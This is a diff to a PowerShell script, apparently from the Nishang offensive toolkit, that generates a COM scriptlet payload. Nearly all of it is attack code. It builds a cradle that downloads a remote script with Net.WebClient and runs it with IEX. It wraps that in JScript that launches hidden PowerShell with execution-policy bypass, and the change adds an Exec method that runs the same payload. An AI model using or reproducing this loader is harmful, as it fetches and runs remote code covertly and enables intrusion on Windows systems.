@@ -70,7 +70,7 @@ https://github.com/samratashok/nishang
     {
         $Payload = "IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
     }  
-    
+    #Below code comes from https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
     $cmd = @"
 <?XML version="1.0"?>
 <scriptlet>
@@ -79,7 +79,8 @@ https://github.com/samratashok/nishang
     classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
 	<!-- Proof Of Concept - Casey Smith @subTee -->
 	<!--  License: BSD3-Clause -->
-	<script language="JScript">
+
+    <script language="JScript">
 		<![CDATA[
 	
 			ps = 'powershell.exe -w h -nologo -noprofile -ep bypass ';
@@ -87,8 +88,23 @@ https://github.com/samratashok/nishang
             r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true);
 	
 		]]>
+	</script>
+    </registration>
+
+    <public>
+    <method name="Exec"></method>
+    </public>
+	<script language="JScript">
+		<![CDATA[
+	        
+            function Exec()
+            {
+			    ps = 'powershell.exe -w h -nologo -noprofile -ep bypass ';
+                c = "$Payload";
+                r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true);
+	        }
+		]]>
 </script>
-</registration>
 </scriptlet>
 "@
 
